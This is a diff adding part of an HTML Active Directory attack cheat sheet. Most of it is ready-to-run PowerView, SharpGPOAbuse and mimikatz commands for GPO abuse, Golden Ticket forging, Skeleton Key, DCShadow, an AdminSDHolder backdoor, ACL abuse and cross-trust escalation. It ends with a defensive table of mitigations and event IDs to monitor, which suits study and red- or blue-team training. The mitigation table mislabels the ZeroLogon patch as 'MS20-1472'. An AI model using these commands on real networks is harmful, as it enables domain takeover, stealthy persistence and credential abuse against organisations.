+  <div class="card">
+    <div class="atk-title">GPO abuse <span class="badge high">High</span></div>
+    <div class="atk-sub">Write permissions on a GPO that applies to a privileged OU or machine allows executing code as SYSTEM, adding local admins, or deploying persistence across all affected machines.</div>
+    <div class="mono"><span class="comment"># Find GPOs you can modify (PowerView)</span>
+Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.ActiveDirectoryRights -match "Write" -and $_.IdentityReference -match "lowpriv"}
+
+<span class="comment"># SharpGPOAbuse</span>
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators attacker /add" --GPOName "Vulnerable GPO"
+
+<span class="comment"># Force immediate GPO refresh</span>
+gpupdate /force</div>
+  </div>
+</div>
+
+<!-- PERSISTENCE -->
+<div id="persist" class="section">
+  <h2>Persistence techniques</h2>
+
+  <div class="card">
+    <div class="atk-title">Golden Ticket <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">The ultimate persistence mechanism. KRBTGT hash + domain SID = forge valid TGTs indefinitely. Survives user password changes, survives admin resets. Only rotating KRBTGT password twice invalidates existing tickets.</div>
+    <div class="mono">kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /id:500 /groups:512,519 /ptt</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Skeleton Key <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Patches LSASS on the DC in memory. After patching, every account accepts "mimikatz" as a master password alongside their real password. Invisible in AD — no attribute changes. Does not survive DC reboot.</div>
+    <div class="mono"><span class="comment"># Run on the Domain Controller</span>
+privilege::debug
+misc::skeleton
+
+<span class="comment"># Now authenticate as ANY user with password "mimikatz"</span>
+net use \\dc.domain.local\admin$ /user:domain\Administrator mimikatz
+Enter-PSSession -ComputerName dc.domain.local -Credential domain\anyuser  <span class="comment"># password: mimikatz</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">DCShadow <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Registers a rogue Domain Controller using legitimate AD replication APIs. Push arbitrary object changes to AD — SID history injection, group membership, ACL changes — without any events logged on the real DC.</div>
+    <div class="mono"><span class="comment"># Terminal 1 — configure the rogue DC and the change</span>
+lsadump::dcshadow /object:attacker /attribute:primaryGroupID /value:512
+
+<span class="comment"># Terminal 2 — trigger replication (push the change)</span>
+lsadump::dcshadow /push
+
+<span class="comment"># Other useful DCShadow changes:</span>
+<span class="comment"># Add SID to SIDHistory: /attribute:sidhistory /value:S-1-5-21-rootSID-519</span>
+<span class="comment"># Set AdminCount: /attribute:admincount /value:1</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">AdminSDHolder backdoor <span class="badge high">High</span></div>
+    <div class="atk-sub">SDProp runs every 60 minutes and resets ACLs on all protected accounts (DA, EA, etc.) to match the AdminSDHolder template. Add yourself to AdminSDHolder's ACL → 60 minutes later you have persistent GenericAll over all DA accounts.</div>
+    <div class="mono"><span class="comment"># Add GenericAll for attacker on AdminSDHolder (requires DA)</span>
+Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All -Verbose
+
+<span class="comment"># Wait 60 min for SDProp, or trigger manually</span>
+Invoke-ADSDPropagation
+
+<span class="comment"># Now you have GenericAll on all DA accounts — reset their passwords</span>
+Set-DomainUserPassword -Identity "Domain Admin" -AccountPassword (ConvertTo-SecureString 'NewP@ss' -AsPlainText -Force)</div>
+  </div>
+</div>
+
+<!-- ACL ABUSE -->
+<div id="acl" class="section">
+  <h2>ACL / permission abuse</h2>
+  <p>Every AD object has an ACL. Misconfigured permissions — often from IT shortcuts or legacy delegation — create invisible attack paths that BloodHound surfaces instantly.</p>
+
+  <div class="card" style="padding:0.5rem 0">
+    <table>
+      <tr><th style="width:170px">ACL right</th><th style="width:110px">Target</th><th>What an attacker can do</th></tr>
+      <tr><td><code>GenericAll</code></td><td>Any object</td><td>Full control — reset password, add to groups, modify any attribute, take ownership, set SPN.</td></tr>
+      <tr><td><code>GenericWrite</code></td><td>Any object</td><td>Write any writable attribute. Set SPN (Kerberoast), set logon script, set msDS-AllowedToActOnBehalfOf (RBCD).</td></tr>
+      <tr><td><code>WriteDACL</code></td><td>Any object</td><td>Modify the object's ACL — grant yourself GenericAll and do anything.</td></tr>
+      <tr><td><code>WriteOwner</code></td><td>Any object</td><td>Change the object owner — as owner you implicitly have WriteDACL.</td></tr>
+      <tr><td><code>ForceChangePassword</code></td><td>User</td><td>Reset user's password without knowing the current one. No authentication needed.</td></tr>
+      <tr><td><code>AddMember</code></td><td>Group</td><td>Add any principal to the group — add yourself to Domain Admins.</td></tr>
+      <tr><td><code>Self</code></td><td>Group</td><td>Add yourself specifically to the group (more limited than AddMember).</td></tr>
+      <tr><td><code>AllExtendedRights</code></td><td>User/Domain</td><td>Includes DCSync rights (on domain object) and password reset (on user).</td></tr>
+      <tr><td><code>Owns</code></td><td>Any object</td><td>Object owner has implicit WriteDACL — chain into GenericAll.</td></tr>
+      <tr><td><code>ReadLAPSPassword</code></td><td>Computer</td><td>Read the LAPS-managed local administrator password in plaintext.</td></tr>
+      <tr><td><code>ReadGMSAPassword</code></td><td>gMSA account</td><td>Read the Group Managed Service Account password.</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Exploiting ACL misconfigurations</div>
+    <div class="mono"><span class="comment"># Find dangerous ACLs (PowerView)</span>
+Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "lowprivuser"}
+
+<span class="comment"># Reset password (ForceChangePassword / GenericAll on user)</span>
+Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ss' -AsPlainText -Force)
+
+<span class="comment"># Add self to group (AddMember / GenericAll on group)</span>
+Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
+
+<span class="comment"># Grant DCSync rights (WriteDACL on domain object)</span>
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
+
+<span class="comment"># Set SPN for Kerberoasting (GenericWrite on user)</span>
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn.domain.local'}
+GetUserSPNs.py domain.local/attacker:pass -request
+
+<span class="comment"># Read LAPS password</span>
+Get-DomainComputer -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
+cme ldap 10.10.10.1 -u user -p pass -M laps</div>
+  </div>
+</div>
+
+<!-- DOMAIN TRUSTS -->
+<div id="trust" class="section">
+  <h2>Domain trust attacks</h2>
+  <p>Trust relationships between domains and forests create cross-boundary attack paths. Compromise a child domain → escalate to the forest root.</p>
+
+  <div class="card">
+    <div class="atk-title">Trust enumeration</div>
+    <div class="mono">nltest /domain_trusts
+Get-ADTrust -Filter *
+Get-DomainTrust          <span class="comment"># PowerView</span>
+Get-ForestTrust          <span class="comment"># PowerView</span>
+Get-DomainTrustMapping   <span class="comment"># PowerView — map all trusts recursively</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Child-to-parent domain escalation <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Each trust has a shared inter-realm trust key. Compromise the child domain → get KRBTGT hash → forge a Golden Ticket with the Enterprise Admins SID (S-1-5-21-rootSID-519) injected into ExtraSids → instant Enterprise Admin on the forest root.</div>
+    <div class="step-row"><div class="step-num">1</div><div class="step-body">Compromise child domain — become DA of child</div></div>
+    <div class="step-row"><div class="step-num">2</div><div class="step-body">Get child KRBTGT hash and child domain SID</div></div>
+    <div class="step-row"><div class="step-num">3</div><div class="step-body">Get root domain SID (Enterprise Admins = rootSID-519)</div></div>
+    <div class="step-row"><div class="step-num">4</div><div class="step-body">Forge Golden Ticket with ExtraSids pointing to EA SID</div></div>
+    <div class="mono"><span class="comment"># Get child KRBTGT hash</span>
+lsadump::dcsync /user:krbtgt /domain:child.domain.local
+
+<span class="comment"># Get root SID</span>
+Get-ADDomain -Identity root.local | select DomainSID
+
+<span class="comment"># Forge cross-realm Golden Ticket</span>
+kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-childSID /sids:S-1-5-21-rootSID-519 /krbtgt:childKRBTGThash /ptt
+
+<span class="comment"># Now access root DC</span>
+ls \\rootdc.root.local\C$</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">SID history injection <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">SID history is used in migrations. An attacker with DA can add any SID (DA, EA, Schema Admins) into a user's SIDHistory attribute — that user silently inherits all privileges of that SID across all trusts.</div>
+    <div class="mono"><span class="comment"># Inject high-privilege SID into SID history (DCShadow or Mimikatz)</span>
+sid::patch
+sid::add /sam:attacker /new:S-1-5-21-rootSID-512     <span class="comment"># Domain Admins of root</span>
+sid::add /sam:attacker /new:S-1-5-21-rootSID-519     <span class="comment"># Enterprise Admins</span>
+
+<span class="comment"># Or via Golden Ticket ExtraSids field</span>
+kerberos::golden ... /sids:S-1-5-21-rootSID-519</div>
+  </div>
+</div>
+
+<!-- DEFENSE -->
+<div id="defense" class="section">
+  <h2>Defense &amp; mitigations</h2>
+  <div class="card" style="padding:0.5rem 0">
+    <table>
+      <tr><th style="width:185px">Attack</th><th>Mitigation</th></tr>
+      <tr><td>Kerberoasting</td><td>25+ char passwords on service accounts. Use gMSA. Enable AES — disable RC4. Monitor Event 4769 for RC4 TGS requests from non-service accounts.</td></tr>
+      <tr><td>AS-REP Roasting</td><td>Disable "Do not require Kerberos preauthentication" on all accounts. Audit regularly: <code>Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}</code></td></tr>
+      <tr><td>Pass-the-Hash</td><td>Enable Protected Users group. Credential Guard. Disable NTLM where possible. Tiered admin model — no DA logins on workstations.</td></tr>
+      <tr><td>LLMNR / NBT-NS</td><td>Disable LLMNR via GPO. Disable NetBIOS over TCP/IP on all adapters. DNS-only name resolution.</td></tr>
+      <tr><td>NTLM Relay</td><td>Enable SMB signing on all machines. Enable LDAP signing + channel binding. Enable EPA. Disable NTLMv1.</td></tr>
+      <tr><td>Golden Ticket</td><td>Rotate KRBTGT password twice (invalidates all tickets). Monitor for tickets with unusually long lifetimes or forged PAC contents.</td></tr>
+      <tr><td>Silver Ticket</td><td>Enable PAC validation. Rotate service account passwords. Monitor for service tickets with no corresponding TGT request.</td></tr>
+      <tr><td>DCSync</td><td>Audit "Replicating Directory Changes" permissions. Alert on Event 4662 from non-DC machine accounts doing replication.</td></tr>
+      <tr><td>Skeleton Key</td><td>Reboot DCs regularly — patch clears it. Virtualization-based security (VBS). Monitor LSASS for unexpected code injection.</td></tr>
+      <tr><td>DCShadow</td><td>Monitor for new Domain Controller registrations. Alert on unexpected replication partners. Restrict CreateChild on Sites container.</td></tr>
+      <tr><td>Unconstrained delegation</td><td>Remove unconstrained delegation from all non-DC accounts. Use constrained or RBCD instead. Block tools like SpoolSample via firewall.</td></tr>
+      <tr><td>ACL abuse</td><td>Regular ACL audits using BloodHound defensively. Remove all unnecessary delegated rights. Alert on AdminSDHolder ACL modifications.</td></tr>
+      <tr><td>ZeroLogon</td><td>Patch MS20-1472 immediately. Enable enforcement mode for Secure Channel in Group Policy.</td></tr>
+      <tr><td>PrintNightmare</td><td>Disable Print Spooler on all DCs and non-print servers. Patch. Restrict operator access to Spooler.</td></tr>
+      <tr><td>Password spraying</td><td>Account lockout policy. Azure AD Smart Lockout. Monitor Event 4625 spikes. Strong password policy + MFA.</td></tr>
+      <tr><td>General hardening</td><td>Tiered admin model (Tier 0/1/2). Privileged Access Workstations (PAW). Microsoft LAPS. JIT access. Regular purple team exercises.</td></tr>
+    </table>
+  </div>
+
+  <div class="card">
+    <div class="label">Key Windows event IDs to monitor</div>
+    <div class="mono">4624  — Logon (watch Type 3 NTLM from unexpected sources)
+4625  — Failed logon (password spray — spike from single source)
+4662  — AD object access (DCSync — non-DC doing replication)
+4720  — User account created
+4728  — Member added to global security group
+4732  — Member added to local security group  
+4756  — Member added to universal security group
+4769  — Kerberos service ticket request (Kerberoasting — RC4 etype 0x17)
+4771  — Kerberos pre-auth failed (AS-REP roasting attempts)
+4776  — NTLM authentication (unexpected NTLM usage)
+7045  — New service installed (PsExec / lateral movement)
+4688  — Process creation (with command line logging enabled)
+5145  — Network share access (SMB lateral movement)</div>
+  </div>
+
+  <div class="card">
+    <div class="label">Useful defensive tools</div>
+    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px">
+      <span class="tag">BloodHound (defensive)</span>
+      <span class="tag">PingCastle</span>
+      <span class="tag">Purple Knight</span>
+      <span class="tag">Microsoft ATA / Defender for Identity</span>
+      <span class="tag">Adalanche</span>
+      <span class="tag">ADRecon</span>
+      <span class="tag">Invoke-TrimarcADChecks</span>
+      <span class="tag">SeatBelt</span>
+    </div>
+  </div>
+</div>
+
+</div>
+<script>
+function show(id,btn){
+  document.querySelectorAll('.section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav button').forEach(b=>b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+}
+</script>
+</body>
+</html>
